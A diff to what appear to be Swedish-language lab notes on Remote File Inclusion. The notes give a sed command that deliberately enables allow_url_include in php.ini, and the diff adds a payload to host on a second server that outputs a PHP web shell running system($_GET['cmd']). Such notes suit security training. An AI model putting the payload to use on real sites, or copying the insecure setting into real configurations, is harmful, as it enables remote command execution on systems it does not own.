@@ -22,7 +22,15 @@ Remote File Inclusion:
 
 	öppna upp sårbarhet i php.ini:
 		sudo sed -i '825s/.*/allow_url_include = On/' /etc/php5/apache2/php.ini 
-	lägg upp script på annan server
+	lägg upp script på annan server:
+		<!--
+			<script>
+        		alert("download this fancy program to use webpage");
+			</script>
+		-->
+		<?php echo "<?php"; ?>
+		system($_GET['cmd']);
+
 	
 
 	
